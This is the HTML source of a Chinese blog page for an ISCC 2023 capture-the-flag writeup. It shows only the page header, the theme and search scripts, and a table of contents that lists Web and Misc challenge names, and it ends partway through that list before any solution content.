@@ -1,0 +1,783 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.17.3"><title>ISCC 2023 Writeup</title><meta name="title" content="ISCC 2023 Writeup"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/iscc-2023/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/iscc-2023/"><meta property="og:title" content="ISCC 2023 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/iscc-2023/"><meta property="twitter:title" content="ISCC 2023 Writeup"><meta property="twitter:description" content><!-- 暗色模式初始化脚本 --><script>
+	// 防止暗色模式闪烁
+	(function() {
+		const theme = localStorage.getItem('theme');
+		const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+		
+		if (theme === 'dark' || (!theme && systemPrefersDark)) {
+			document.documentElement.classList.add('dark');
+		} else {
+			document.documentElement.classList.remove('dark');
+		}
+	})();
+</script><script lang="js">
+			// 动态导入 APlayer 并挂载到全局对象
+			import('aplayer').then(function(APlayerModule) {
+				window.APlayer = APlayerModule.default;
+			});
+		</script><link rel="stylesheet" href="/_astro/_slug_.DNYbVg5E.css">
+<link rel="stylesheet" href="/_astro/waline.BpVnDCEn.css">
+<link rel="stylesheet" href="/_astro/_slug_.N2UNtMs9.css">
+<style>.toc[data-astro-cid-woz2nwfv]{position:fixed;top:12rem;right:6rem;width:260px;max-height:calc(100vh - 16rem);overflow-y:auto;padding:1.5rem;font-size:.9375rem;line-height:1.5;z-index:100}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar{width:4px}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#0003;border-radius:2px}.dark[data-astro-cid-woz2nwfv] .toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#ffffff4d}@media(max-width:1280px){.toc[data-astro-cid-woz2nwfv]{position:static;width:100%;max-height:none;margin:2rem 0}}.toc-title[data-astro-cid-woz2nwfv]{font-size:1rem;font-weight:600;margin:0 0 1rem}.toc-list[data-astro-cid-woz2nwfv],.toc-sublist[data-astro-cid-woz2nwfv]{list-style:none;padding:0;margin:0}.toc-sublist[data-astro-cid-woz2nwfv]{padding-left:1.25rem;margin:.25rem 0}.toc-link[data-astro-cid-woz2nwfv]{display:block;text-decoration:none;padding:.375rem .5rem;margin:.125rem 0;border-radius:.5rem;font-weight:400}.toc-link[data-astro-cid-woz2nwfv].active{font-weight:500;background:#3b82f61a!important;color:#3b82f6!important}.dark[data-astro-cid-woz2nwfv] .toc-link[data-astro-cid-woz2nwfv].active{background:#60a5fa33!important;color:#60a5fa!important}.lightbox[data-astro-cid-vqtgpguw]{position:fixed;inset:0;z-index:500;display:flex;align-items:center;justify-content:center;animation:fade-in .3s;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);background:#3037424d;overflow:hidden;padding:20px;box-sizing:border-box}.lightbox[data-astro-cid-vqtgpguw].exit{animation:fade-out .3s}@keyframes fade-in{0%{opacity:0}}@keyframes fade-out{to{opacity:0}}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:80vw!important;max-height:75vh!important;width:auto!important;height:auto!important;-o-object-fit:contain!important;object-fit:contain!important;border-radius:3px;cursor:zoom-out;display:block!important;margin:0 auto;opacity:0;transition:opacity .3s ease}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw].show{opacity:1}.lightbox[data-astro-cid-vqtgpguw] .toolbar[data-astro-cid-vqtgpguw]{position:absolute;bottom:5%;left:1rem;right:1rem;display:flex;justify-content:space-between;align-items:center;color:#fff;max-width:600px;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);margin:0 auto;padding:10px;border-radius:5px;background:#0000001a;z-index:1}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]{width:32px;height:32px;display:flex;justify-content:center;align-items:center;cursor:pointer;border-radius:3px;background:#fff3;transition:all .2s}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]:hover{background:#ffffff80}.lightbox[data-astro-cid-vqtgpguw] .counter[data-astro-cid-vqtgpguw]{width:60px;display:flex;align-items:center;justify-content:center;font-size:14px}.lightbox[data-astro-cid-vqtgpguw] .nav[data-astro-cid-vqtgpguw]{display:flex;gap:10px}@media(max-width:768px){.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:75vw!important;max-height:65vh!important}}
+</style></head> <body class="bg-white dark:bg-gray-900 transition-colors duration-300"> <header class="relative m-0 px-4 py-4" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a><a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a><a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a><a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a><a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 桌面端搜索和主题切换按钮 --> <div class="absolute right-4 top-1/2 transform -translate-y-1/2 hidden md:flex items-center gap-3" data-astro-cid-3ef6ksr2> <button id="search-btn" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" title="搜索 (Ctrl+K)" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+(function() {
+	function getSystemTheme() {
+		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+	}
+
+	function getCurrentTheme() {
+		const saved = localStorage.getItem('theme');
+		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
+	}
+
+	function applyTheme(theme) {
+		document.documentElement.classList.toggle('dark', theme === 'dark');
+	}
+
+	function toggleTheme() {
+		const isDark = document.documentElement.classList.contains('dark');
+		const newTheme = isDark ? 'light' : 'dark';
+		localStorage.setItem('theme', newTheme);
+		applyTheme(newTheme);
+	}
+
+	function init() {
+		applyTheme(getCurrentTheme());
+		document.querySelectorAll('.theme-toggle').forEach(btn => {
+			if (!btn.dataset.ready) {
+				btn.addEventListener('click', toggleTheme);
+				btn.dataset.ready = 'true';
+			}
+		});
+	}
+
+	init();
+
+	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+		const saved = localStorage.getItem('theme');
+		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
+	});
+
+	document.addEventListener('astro:page-load', init);
+})();
+</script>  </div> <!-- 移动端控件 --> <div class="md:hidden flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <button id="menu-btn" class="flex flex-col space-y-1 p-2 text-black dark:text-white" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <div class="flex items-center gap-2" data-astro-cid-3ef6ksr2> <button id="search-btn-mobile" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+(function() {
+	function getSystemTheme() {
+		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+	}
+
+	function getCurrentTheme() {
+		const saved = localStorage.getItem('theme');
+		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
+	}
+
+	function applyTheme(theme) {
+		document.documentElement.classList.toggle('dark', theme === 'dark');
+	}
+
+	function toggleTheme() {
+		const isDark = document.documentElement.classList.contains('dark');
+		const newTheme = isDark ? 'light' : 'dark';
+		localStorage.setItem('theme', newTheme);
+		applyTheme(newTheme);
+	}
+
+	function init() {
+		applyTheme(getCurrentTheme());
+		document.querySelectorAll('.theme-toggle').forEach(btn => {
+			if (!btn.dataset.ready) {
+				btn.addEventListener('click', toggleTheme);
+				btn.dataset.ready = 'true';
+			}
+		});
+	}
+
+	init();
+
+	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+		const saved = localStorage.getItem('theme');
+		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
+	});
+
+	document.addEventListener('astro:page-load', init);
+})();
+</script>  </div> </div> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white dark:bg-gray-800 rounded-xl shadow-2xl border border-gray-100 dark:border-gray-700 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Home </a><a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Blog </a><a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Links </a><a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Comment </a><a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),n=document.getElementById("menu");function i(){n?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单")}function d(){n?.classList.remove("hidden"),e?.classList.add("open"),e?.setAttribute("aria-expanded","true"),e?.setAttribute("aria-label","关闭菜单")}e&&n&&(e.addEventListener("click",()=>{e.classList.contains("open")?i():d()}),e.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())}),document.addEventListener("keydown",t=>{t.key==="Escape"&&e.classList.contains("open")&&(i(),e.focus())}),document.addEventListener("click",t=>{const s=t.target;!e.contains(s)&&!n.contains(s)&&i()}));const c=document.getElementById("search-btn"),a=document.getElementById("search-btn-mobile");function o(){typeof window.openSearchModal=="function"&&window.openSearchModal()}c&&c.addEventListener("click",o);a&&a.addEventListener("click",o);</script>  <!-- 搜索模态框 --><div id="search-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/50 dark:bg-black/70 backdrop-blur-sm" role="dialog" aria-modal="true" aria-labelledby="search-modal-title" data-astro-cid-qk3db3zz> <div class="relative w-full max-w-2xl mx-4 bg-white dark:bg-gray-800 rounded-2xl shadow-2xl transform transition-all" id="search-modal-content" data-astro-cid-qk3db3zz> <!-- 搜索框 --> <div class="p-4 border-b border-gray-200 dark:border-gray-700" data-astro-cid-qk3db3zz> <div class="relative" data-astro-cid-qk3db3zz> <input type="text" id="search-modal-input" placeholder="输入关键词搜索文章..." class="w-full px-4 py-3 pl-10 pr-10 text-base bg-gray-100 dark:bg-gray-700 rounded-xl border border-transparent
+            placeholder:text-gray-400 dark:placeholder:text-gray-500
+            focus:ring-2 focus:ring-blue-500/30 focus:border-blue-500/50 focus:bg-white dark:focus:bg-gray-600
+            focus:outline-none
+            transition-all duration-200
+            text-gray-900 dark:text-white" autocomplete="off" data-astro-cid-qk3db3zz> <div class="absolute left-3 top-1/2 -translate-y-1/2" data-astro-cid-qk3db3zz> <svg class="w-5 h-5 text-gray-400 dark:text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <button id="search-modal-close" class="absolute right-3 top-1/2 -translate-y-1/2 p-1 text-gray-400 dark:text-gray-500 hover:text-gray-600 dark:hover:text-gray-300 transition-colors" aria-label="关闭搜索" data-astro-cid-qk3db3zz> <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" data-astro-cid-qk3db3zz></path> </svg> </button> </div> </div> <!-- 搜索结果容器 --> <div class="max-h-[60vh] overflow-y-auto" data-astro-cid-qk3db3zz> <!-- 搜索结果 --> <div id="search-modal-results" class="p-4 space-y-3" data-astro-cid-qk3db3zz> <!-- 结果将在这里动态插入 --> </div> <!-- 空状态 --> <div id="search-modal-empty" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="mb-4" data-astro-cid-qk3db3zz> <svg class="w-12 h-12 text-gray-300 dark:text-gray-600 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <h3 class="text-base font-medium text-gray-900 dark:text-gray-100 mb-2" data-astro-cid-qk3db3zz>
+未找到相关文章
+</h3> <p class="text-sm text-gray-500 dark:text-gray-400" data-astro-cid-qk3db3zz>
+试试其他关键词
+</p> </div> <!-- 加载状态 --> <div id="search-modal-loading" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="inline-block animate-spin h-6 w-6 border-2 border-gray-400 dark:border-gray-500 border-t-transparent rounded-full" data-astro-cid-qk3db3zz></div> </div> </div> <!-- 快捷键提示 --> <div class="px-4 py-2 border-t border-gray-200 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400 flex items-center justify-between" data-astro-cid-qk3db3zz> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>Esc</kbd> 关闭</span> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>↑</kbd><kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs ml-1" data-astro-cid-qk3db3zz>↓</kbd> 导航</span> </div> </div> </div> <script type="module">let L=[],p=null,a=-1,h=[];const s=document.getElementById("search-modal");document.getElementById("search-modal-content");const i=document.getElementById("search-modal-input"),x=document.getElementById("search-modal-close"),c=document.getElementById("search-modal-results"),l=document.getElementById("search-modal-empty"),y=document.getElementById("search-modal-loading");async function b(){if(!(L.length>0))try{L=await(await fetch("/search.json")).json()}catch(e){console.error("加载搜索索引失败:",e)}}function u(e){const t=document.createElement("div");return t.textContent=e,t.innerHTML}function k(e,t){if(!t.trim())return e;const n=new RegExp(`(${t.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")})`,"gi");return e.replace(n,'<mark class="bg-yellow-200 dark:bg-yellow-800/50 px-0.5 rounded">$1</mark>')}function M(e){if(!e.trim())return[];const t=e.toLowerCase(),n=[];for(const r of L){const d=r.title.toLowerCase().includes(t),m=r.content.toLowerCase().includes(t),g=r.categories.some(o=>o.toLowerCase().includes(t)),v=r.tags.some(o=>o.toLowerCase().includes(t));if(d||m||g||v){let o=0;d&&(o+=10),m&&(o+=1),g&&(o+=3),v&&(o+=3),n.push({...r,score:o})}}return n.sort((r,d)=>r.score!==d.score?(d.score||0)-(r.score||0):new Date(d.date).getTime()-new Date(r.date).getTime())}function T(e,t){if(!(!c||!l||!y)){if(y.classList.add("hidden"),a=-1,e.length===0){c.innerHTML="",l.classList.remove("hidden");return}l.classList.add("hidden"),c.innerHTML=e.map((n,r)=>{const d=k(u(n.title),t),m=k(u(n.excerpt),t),g=new Date(n.date).toLocaleDateString("zh-CN",{year:"numeric",month:"short",day:"numeric"});return`
+        <a 
+          href="${u(n.url)}" 
+          class="block p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors search-result-item ${r===a?"bg-gray-100 dark:bg-gray-700":""}"
+          data-index="${r}"
+        >
+          <h3 class="text-base font-semibold text-gray-900 dark:text-white mb-1">${d}</h3>
+          <p class="text-sm text-gray-600 dark:text-gray-400 mb-2 line-clamp-1">${m}</p>
+          <div class="flex flex-wrap items-center gap-2 text-xs text-gray-500 dark:text-gray-400">
+            <time datetime="${n.date}">${g}</time>
+            ${n.categories.length>0?`<span>·</span><span>${u(n.categories[0])}</span>`:""}
+            ${n.tags.length>0?`<span>·</span><span>${u(n.tags[0])}</span>`:""}
+          </div>
+        </a>
+      `}).join(""),w()}}function w(){c?.querySelectorAll(".search-result-item")?.forEach((t,n)=>{n===a?t.classList.add("bg-gray-100","dark:bg-gray-700"):t.classList.remove("bg-gray-100","dark:bg-gray-700")})}function I(){if(!i)return;const e=i.value.trim();if(p&&clearTimeout(p),e.length===0){c&&l&&(c.innerHTML="",l.classList.add("hidden"));return}y&&y.classList.remove("hidden"),p=setTimeout(()=>{h=M(e),T(h,e)},200)}function E(){!s||!i||(s.classList.remove("hidden"),s.classList.add("flex"),setTimeout(()=>{i.focus()},100),b(),document.body.style.overflow="hidden")}function f(){!s||!i||(s.classList.add("hidden"),s.classList.remove("flex"),i.value="",c&&l&&(c.innerHTML="",l.classList.add("hidden")),a=-1,h=[],document.body.style.overflow="")}function $(){!s||!i||!x||(s.addEventListener("click",e=>{e.target===s&&f()}),x.addEventListener("click",f),i.addEventListener("input",I),i.addEventListener("keydown",e=>{if(e.key==="Escape")e.preventDefault(),f();else if(e.key==="ArrowDown")e.preventDefault(),a<h.length-1&&(a++,w());else if(e.key==="ArrowUp")e.preventDefault(),a>0&&(a--,w());else if(e.key==="Enter"&&a>=0){e.preventDefault();const t=c?.querySelector(`[data-index="${a}"]`);t&&(window.location.href=t.href)}}),document.addEventListener("keydown",e=>{(e.metaKey||e.ctrlKey)&&e.key==="k"&&(e.preventDefault(),s?.classList.contains("hidden")?E():f())}),window.openSearchModal=E)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",$):$();</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 dark:text-white mb-6 tracking-tight leading-tight"> ISCC 2023 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2023-06-05T21:22:03.000Z" class="text-[#86868b] dark:text-gray-400 tracking-wide"> <time datetime="2023-06-05T21:22:03.000Z"> Jun 5, 2023 </time> </time>  <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] dark:text-gray-400 tracking-wide" aria-label="阅读时间 15 min read">15 min read</span>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/技术.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 技术 下的所有文章"> 技术 </a>  </nav>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/CTF.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 CTF 下的所有文章"> CTF </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/Writeup.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 Writeup 下的所有文章"> Writeup </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/网络安全.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a>  </nav>  </div> </header>  <nav class="toc transition-colors duration-300" aria-label="文章目录" data-astro-cid-woz2nwfv> <h2 class="toc-title text-gray-900 dark:text-white" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#写在前面" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1. 写在前面 </a>  </li><li data-astro-cid-woz2nwfv> <a href="#web" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2. Web </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#小周的密码锁" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.1. 小周的密码锁 </a> </li><li data-astro-cid-woz2nwfv> <a href="#羊了个羊" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.2. 羊了个羊 </a> </li><li data-astro-cid-woz2nwfv> <a href="#chatggg" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.3. Chatggg </a> </li><li data-astro-cid-woz2nwfv> <a href="#where_is_your_love" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.4. Where_is_your_love </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#misc" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3. Misc </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#好看的维吾尔族小姐姐" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.1. 好看的维吾尔族小姐姐 </a> </li><li data-astro-cid-woz2nwfv> <a href="#菜鸟黑客1" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.2. 菜鸟黑客1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#菜鸟黑客2" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.3. 菜鸟黑客2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#消息传递" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.4. 消息传递 </a> </li><li data-astro-cid-woz2nwfv> <a href="#你相信ai吗" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.5. 你相信AI吗？ </a> </li><li data-astro-cid-woz2nwfv> <a href="#汤姆历险记" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 